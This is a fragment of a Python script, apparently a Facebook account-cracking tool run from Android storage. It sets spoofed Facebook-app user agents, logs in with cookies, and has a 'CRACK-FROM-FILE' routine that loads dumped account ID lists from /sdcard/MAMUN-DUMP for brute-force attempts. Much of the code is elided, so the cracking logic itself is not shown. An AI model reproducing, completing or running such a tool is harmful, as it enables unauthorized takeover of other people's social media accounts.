...
pretty.install()
CON=sol()
ugen2=['Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]']
ugen=['Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/5.7.0.6']
cokbrut=[]
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t Login Cookies : [green]Bbz[white] '))
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL..run again the command!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(nel('\tWelcome [yellow]%s[white] Honey'%(my_name)))
	print(f'[+] Your Idz : '+str(my_id))
	print(f'\033[1;31m[+] Your Ip  : {ip}')
	print('')
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/MAMUN-DUMP')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/MAMUN-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/MAMUN-DUMP/'+geh,'r').read().splitlines()
		except:
